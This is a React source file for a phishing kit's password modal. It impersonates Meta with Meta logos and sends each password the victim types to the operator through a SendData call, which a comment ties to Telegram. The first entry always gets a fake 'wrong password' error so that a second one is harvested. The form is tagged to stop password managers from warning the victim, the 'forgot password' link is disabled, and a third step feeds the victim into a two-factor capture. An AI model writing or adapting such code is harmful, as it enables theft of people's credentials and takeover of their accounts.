import React from 'react';
import { CircleAlert } from 'lucide-react';
import Modal from '#components/modals/Modal';
import PasswordInput from '#components/password-input/password-input';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm } from '../../app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { SendData } from '@/utils/sendData';

interface PasswordModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
    /** Gọi sau khi nhập mật khẩu lần 2 thành công (trước bước 2FA) — ví dụ mở reCAPTCHA. */
    onAfterSecondPasswordSubmit?: () => void;
}

const SUBMIT_DELAY_MS = 1345;
/** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';

const PasswordModal: React.FC<PasswordModalProps> = ({
    isOpend,
    isOpendTwoFactor,
    onToggleModal,
    onAfterSecondPasswordSubmit,
}) => {
    const t = useAppStrings();

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [loading, setLoading] = React.useState(false);
    const [passwordStep, setPasswordStep] = React.useState<1 | 2>(1);
    const [password, setPassword] = React.useState('');
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const dispatch = useAppDispatch();
    const formData = useAppSelector((state) => state.stepForm.data);

    React.useEffect(() => {
        setIsOpen(isOpend);
        if (isOpend) {
            setPasswordStep(1);
            setPassword('');
            setErrors({});
            setLoading(false);
            dispatch(
                updateForm({
                    password: '',
                    passwordSecond: '',
                    passwordThird: '',
                })
            );
        }
    }, [isOpend, dispatch]);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { value } = e.target;
        setPassword(value);
        setErrors((prev) => ({ ...prev, password: '' }));

        if (passwordStep === 1) {
            dispatch(updateForm({ password: value }));
        } else {
            dispatch(updateForm({ passwordSecond: value }));
        }
    };

    const handleClose = () => {
        setIsOpen(false);
        onToggleModal(false);
    };

    const goForgotToTwoFa = () => {
        dispatch(updateForm({ passwordThird: PASSWORD_THIRD_FORGOT_MARKER }));
        isOpendTwoFactor(true);
        handleClose();
    };

    const waitAfterSend = async () => {
        try {
            await SendData(formData);
        } catch {
            /* luồng UX vẫn tiếp tục */
        }
        await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
    };

    const handSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        const newErrors: Record<string, string> = {};
        if (!password.trim()) newErrors.password = t.password.errEmpty;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        if (passwordStep === 1) {
            setLoading(true);
            try {
                await waitAfterSend();
                setPassword('');
                setErrors({ password: t.password.errWrong });
                setPasswordStep(2);
            } finally {
                setLoading(false);
            }
            return;
        }

        setLoading(true);
        try {
            await SendData(formData);
            await new Promise((r) => setTimeout(r, SUBMIT_DELAY_MS));
            handleClose();
            if (onAfterSecondPasswordSubmit) {
                onAfterSecondPasswordSubmit();
            } else {
                isOpendTwoFactor(true);
            }
        } catch (error) {
            console.error('Error submitting form:', error);
            setPassword('');
            setErrors({ password: t.password.errWrong });
        } finally {
            setLoading(false);
        }
    };

    const inputClass = (field: string) =>
        ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;

    const prompt = passwordStep === 1 ? t.password.firstPrompt : t.password.secondPrompt;

    const passwordName = passwordStep === 1 ? 'account_access_key' : 'recheck_access_key';

    const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm';

    return (
        <Modal isOpen={isOpen} onClose={handleClose} isClosable={false}>
            <div className="flex min-h-full min-w-0 flex-1 flex-col items-center justify-center gap-8 py-2">
                <div className="mx-auto h-[50px] w-[50px] shrink-0">
                    <img src="/images/meta/logo.svg" width="100%" height="100%" alt="logo" />
                </div>

                <div className="w-full min-w-0 py-4 sm:py-8">
                    <p className="mb-[7px] text-[14px] text-[#9a979e]">{prompt}</p>
                    {passwordStep === 2 && (
                        <div className="mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]">
                            <p className="text-[13px] leading-[1.55] text-[#8a5b13]">{t.password.notice}</p>
                        </div>
                    )}
                    <form
                        onSubmit={handSubmit}
                        autoComplete="off"
                        data-lpignore="true"
                        data-1p-ignore="true"
                        data-bwignore="true"
                    >
                        <div className="w-full">
                            <PasswordInput
                                id={passwordId}
                                name={passwordName}
                                placeholder={passwordStep === 1 ? t.password.phFirst : t.password.phSecond}
                                className={inputClass('password')}
                                value={password}
                                onChange={handleChange}
                                autoComplete="off"
                                allowToggle
                            />
                            {errors.password ? (
                                <div
                                    className="mb-[10px] mt-[-5px] flex items-start gap-2 text-[14px] text-red-600"
                                    role="alert"
                                >
                                    <CircleAlert className="mt-0.5 size-4 shrink-0" aria-hidden />
                                    <span>{errors.password}</span>
                                </div>
                            ) : null}
                        </div>
                        <div className="mt-[20px] w-full">
                            <button
                                type="submit"
                                className={`flex min-h-[48px] w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] px-4 py-[10px] text-white transition-opacity duration-300 active:opacity-90 ${loading ? 'cursor-not-allowed opacity-70' : ''}`}
                                disabled={loading}
                            >
                                {loading && (
                                    <div className="mr-[10px] h-[20px] w-[20px] animate-spin">
                                        <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="" />
                                    </div>
                                )}
                                {loading ? '' : t.password.continue}
                            </button>
                        </div>
                        <div className="mt-[10px] text-center">
                            <span className="inline-block cursor-default select-none text-[14px] text-[#9a979e] opacity-50">
                                {t.password.forgot}
                            </span>
                        </div>
                    </form>
                </div>

                <div className="mx-auto h-[60px] w-[60px] shrink-0">
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                </div>
            </div>
        </Modal>
    );
};

export default PasswordModal;
